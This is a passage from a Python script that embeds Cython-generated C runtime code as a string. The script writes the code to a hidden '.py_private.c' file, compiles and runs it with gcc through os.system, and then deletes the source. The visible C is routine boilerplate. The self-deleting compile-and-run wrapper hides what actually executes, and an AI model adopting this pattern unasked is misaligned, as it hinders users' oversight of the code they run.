                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
